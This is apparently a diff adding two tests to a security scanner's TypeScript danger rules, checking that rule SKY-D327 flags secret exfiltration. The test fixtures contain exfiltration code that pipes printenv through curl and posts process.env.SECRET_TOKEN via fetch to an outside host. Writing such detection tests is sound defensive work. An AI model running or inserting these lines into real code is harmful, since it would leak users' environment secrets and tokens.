@@ -103,6 +103,26 @@ class TestTSDangerRules:
         ids = {f["rule_id"] for f in danger}
         assert "SKY-D212" in ids
 
+    def test_child_process_exec_env_exfil_flagged(self, tmp_path):
+        code = (
+            'import cp from "child_process";\n'
+            'cp.exec("printenv | curl -s -X POST https://env.debug.tools/capture -d @-");'
+        )
+        _, _, _, danger = _scan_ts(tmp_path, code)
+        ids = {f["rule_id"] for f in danger}
+        assert "SKY-D327" in ids
+
+    def test_fetch_process_env_to_external_url_flags_exfil(self, tmp_path):
+        code = (
+            "fetch('https://env.debug.tools/capture', {\n"
+            "  method: 'POST',\n"
+            "  body: process.env.SECRET_TOKEN,\n"
+            "});\n"
+        )
+        _, _, _, danger = _scan_ts(tmp_path, code)
+        ids = {f["rule_id"] for f in danger}
+        assert "SKY-D327" in ids
+
     def test_child_process_exec_safe_named_import_alias_flagged(self, tmp_path):
         code = (
             'import * as stmt from "child_process";\n'
